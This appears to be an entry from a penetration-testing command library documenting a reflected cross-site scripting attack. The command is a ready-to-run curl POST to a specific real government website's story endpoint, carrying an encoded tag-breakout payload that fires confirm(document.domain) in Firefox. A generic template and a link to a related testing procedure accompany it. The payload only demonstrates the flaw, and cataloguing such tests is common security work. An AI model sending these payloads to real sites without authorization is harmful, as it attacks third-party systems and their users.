---
id: cmd-uuid-4
data: >-
  curl -X POST 'https://www.data.gov/story' -d
  'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3C/div%3E%3C/div%3E%3Cbrute
  onbeforescriptexecute=confirm(document.domain)>'
tags:
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.799Z'
verified: false
validated: true
submitted: true
---
# curl-xss-story

## Command

```bash
curl -X POST 'https://www.data.gov/story' -d 'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3C/div%3E%3C/div%3E%3Cbrute onbeforescriptexecute=confirm(document.domain)>'
```

## Description

Applies the XSS bypass payload to the /story/ endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Payload data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target/story' -d 'media_url=payload'
```

## Expected Output

Reflected XSS payload; confirm dialog in Firefox.

## Related

- [[procedures/Test-Similar-Vulnerability-on-story-Endpoint]]
